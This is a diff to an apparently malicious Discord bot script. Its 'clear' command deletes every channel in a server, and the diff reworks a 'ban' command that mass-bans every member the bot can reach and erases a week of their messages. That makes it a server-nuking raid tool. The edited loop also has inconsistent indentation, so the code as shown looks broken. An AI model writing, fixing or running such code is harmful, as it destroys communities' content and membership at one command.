@@ -25,14 +25,13 @@ async def clear(ctx):
     for channel in guild.channels:
         await channel.delete()
 
+      
 @client.command()
 async def ban(ctx):
-    for member in list(ctx.guild.members):
-      try:
-        await member.ban(reason="pooooop", delete_message_days=7)
-        print(f"Banned {member.display_name}!")
-        print("Banning is complete!")
-      except Exception:
-        pass
-
+   for member in client.get_all_members():
+        if member.bot and SKIP_BOTS:
+           continue
+        await member.ban(reason="Banned by BanBot", delete_message_days=7)
+    
+    
 client.run(os.environ['token'])
